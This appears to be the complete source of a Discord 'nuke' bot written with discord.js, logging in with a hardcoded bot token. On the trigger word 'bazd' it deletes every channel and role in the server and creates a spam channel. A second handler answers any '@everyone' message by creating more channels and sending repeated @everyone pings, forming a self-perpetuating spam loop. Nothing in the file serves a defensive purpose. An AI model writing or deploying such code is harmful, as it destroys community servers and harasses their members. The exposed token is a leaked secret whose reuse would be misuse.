const Discord = require ('discord.js');
const client = new Discord.Client();

client.login("NzgzMzg4MjY2NjQ0NzY2NzIw.X8aBLQ.n1B_a1oNpIMXJYacYtfnfs8TD1c")//TOKEN
client.on('message', async (message) => {
  if (message.content === 'bazd' ) {
    message.guild.channels.cache.forEach
    (channel => channel.delete());
    message.guild.roles.cache.forEach
    (role => role.delete());

    await message.guild.channels.create
    ('bazd', {
      type : 'text'
    }).then(async channel=> {
      channel.send('@everyone')
    })
  }
})

client.on('message', async (message) =>{
  if (message.content ==='@everyone') {
    await message.guild.channels.create
    ('bazd', {
      type : 'text'
    }).then(async channel=> {
      channel.send('@everyone')
    message.channel.send('@everyone')
    message.channel.send('@everyone')
    message.channel.send('@everyone')
    message.channel.send('@everyone')
    message.channel.send('@everyone')
    message.channel.send('@everyone')
    message.channel.send('@everyone')
    message.channel.send('@everyone')
  })
  }
})
